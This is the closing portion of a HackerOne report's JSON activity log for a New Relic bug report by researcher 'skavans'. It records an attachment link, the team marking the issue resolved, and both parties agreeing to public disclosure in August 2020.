+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/r8dLDNAr2KM4sGaofHHByCs9?response-content-disposition=attachment%3B%20filename%3D%22_37.gif%22%3B%20filename%2A%3DUTF-8%27%27_37.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPXH7W2A%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072514Z&X-Amz-Expires=1014&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIHPD5gEySofUz1xOLbF9RxzsoYi23gDFF6VpbtbxOEbOAiB0gZ0PrWMj9ApM1upCkFsCGj2wZDr0sHM%2FdCN3TWiFlSqwBQgjEAMaDDAxMzYxOTI3NDg0OSIMFefSibaONAmXZdeqKo0FrStIIybrOK6bEwZr5pyK3JxTPHUorBb2V3hjVumlSUzrcUlJuskVWrmNd4RZL3xYp2NFjX6sZJlmfTosswJ6ixEgQRESjrdVab2HF45mm1trgD3HzrFdEa05QJxHMZHXuB0vxaGaUOTokNTEwFLItAjHN8%2FHLB9ycpatLFRq4uVN52spSmTZuDQndEo8CrKUsfA6BtwhxzLkkyZXne1e7M4CpAzxKNKcPiko1jpES02h%2Fmpk5SDR%2BRZgUwj065jAzDlJI%2FvKBvp8t7GbOQq5n5ZWH%2Bz25xRNvUE4i5RKXJizerdDmxAuRROSFAzpdj497%2Fu1CSvhiDHUA%2FVbn8aRwo5DUTNtQtdEeOAEEwiUDCqAgMd5lKuIYIFEIDBuOZNAgvte6VgIXN37ZrqXGK1lsZDS2Hv2bBBHglR9kA4uWBUlZddQ0fUlTAThnBO%2FkixEijGrsWLkkqt8dXMp%2FKYzi2wtDguJlqkw8pnHiViufOnyhy3mr5aLppahgdAOgCchFtV7W9lAV4PB4O0o4p2B9tFko0Jtrln3CsOFrrIzCFf%2BqS2LdxwMZ1jZR3buat3bHV7T5DKtUBs4MGMx6kIi%2FI8gpiY69A3lVRFCjHfWE12sqHEdq9rnG07syd1vglEXDaqqJe%2BYfYR5Ee8nKmckWCkLt0pEGiIA%2FRI%2Bs0ch6NccoW1IiW1uRJG2o64XI%2Bhv3%2Ff2Jg1XfOr%2FKnljk3KQypfib6Zo3eySEuL4cPDCbFIQ%2B4fpUtNBwB%2B6TbMKThow0d%2B9zURqcAZ6QSoDbaT9p04JVxFeOyWzLmH5zvIIt52C%2FVUHGoRrO3ELP6qYs0snGQH6%2FmKbyjnqEMAatXzXI2U9K25Q6ELBK1NGPV0wwYC5qAY6sgHvPFSU40Te8U3TvG0%2FxnZKpqRY7RwHe0EqI8E%2Ffn%2FbAzZtS1msTHhvGiqBntJ%2BccpQwaI%2F7uuwU5ZbJ0JKOVnnBIFFbA%2F2LUwsTSOccxF6VQyLkJQfo0TACBsb8BuejEQN1JySWmkU0BakfQo05LRh87A3TuiIhaxJJzE6m%2B%2BClcIezMNMH9ULosA4UY1PvvIIQAIFyFjboubORtGvP383QMi6o8GCABrtvUKoxEMaCYgZ&X-Amz-SignedHeaders=host&X-Amz-Signature=1f0913a115c1799e7363716d6395718d4a7d22e8e78037fa26123725215d61b9"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "newrelic",
+      "collaborator": {
+        "username": "skavans",
+        "url": "/skavans"
+      }
+    },
+    {
+      "id": 8040345,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi @skavans . The team marked this as complete. If you find a workaround feel free to comment in this ticket and we can re-open it. Have a good one.",
+      "automated_response": false,
+      "created_at": "2020-05-18T19:02:31.359Z",
+      "updated_at": "2020-05-18T19:02:31.359Z",
+      "actor": {
+        "username": "scutler",
+        "cleared": false,
+        "verified": false,
+        "url": "/scutler",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/460/179/2c3ae155f2d3e021cae9e7e75456335c3c5514cd_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "skavans",
+        "url": "/skavans"
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 8902646,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-11T09:40:36.640Z",
+      "updated_at": "2020-08-11T09:40:36.640Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 8923154,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Can we disclose this?",
+      "automated_response": false,
+      "created_at": "2020-08-13T08:30:50.264Z",
+      "updated_at": "2020-08-13T08:30:50.264Z",
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 8927984,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-13T15:40:49.294Z",
+      "updated_at": "2020-08-13T15:40:49.294Z",
+      "actor": {
+        "username": "nr-dm",
+        "cleared": false,
+        "verified": false,
+        "url": "/nr-dm",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 8927985,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-13T15:40:49.406Z",
+      "updated_at": "2020-08-13T15:40:49.406Z",
+      "actor": {
+        "username": "nr-dm",
+        "cleared": false,
+        "verified": false,
+        "url": "/nr-dm",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
